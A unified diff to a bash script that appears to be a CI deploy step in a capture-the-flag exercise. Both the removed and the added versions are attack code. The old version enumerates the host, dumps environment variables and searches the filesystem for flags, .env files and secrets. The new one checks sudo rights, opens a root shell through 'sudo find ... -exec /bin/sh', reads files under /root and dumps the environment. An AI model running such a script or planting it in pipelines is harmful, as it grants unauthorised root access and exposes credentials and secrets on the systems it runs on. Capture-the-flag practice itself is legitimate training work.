@@ -1,32 +1,28 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-echo "[+] Host info"
-hostname
-whoami
-id
-pwd
+echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
 
-echo "[+] Environment variables"
-env | sort
+echo "=== CI FLAG ==="
+cat /opt/void/ci_flag.txt 2>/dev/null || echo "No ci_flag"
 
-echo "[+] Interesting directories"
-ls -la /
-ls -la /opt || true
-ls -la /opt/void || true
-ls -la /home || true
+echo "=== SUDO CHECK ==="
+sudo -l
 
-echo "[+] Searching for flags"
-find / -iname "*flag*" 2>/dev/null || true
+echo "=== ROOT ACCESS VIA FIND ==="
+sudo find /root -exec /bin/sh \; -quit
 
-echo "[+] Searching for secrets"
-find / -iname "*.env" 2>/dev/null || true
-find / -iname "*secret*" 2>/dev/null || true
+echo "=== ROOT FLAG SEARCH ==="
+sudo find / -iname "*flag*" 2>/dev/null
 
-echo "[+] CI FLAG"
-cat /opt/void/ci_flag.txt || true
+echo "=== TRY READING ROOT FILES ==="
+sudo cat /root/flag.txt 2>/dev/null || true
+sudo cat /root/root.txt 2>/dev/null || true
+sudo ls -la /root 2>/dev/null || true
 
-echo "[+] Root flag attempts"
-cat /root/root.txt 2>/dev/null || true
-cat /flag.txt 2>/dev/null || true
-cat /root/flag.txt 2>/dev/null || true
+echo "=== VOID DIRECTORY ==="
+sudo ls -la /opt/void 2>/dev/null || true
+sudo find /opt/void -type f 2>/dev/null || true
+
+echo "=== ENV ==="
+env
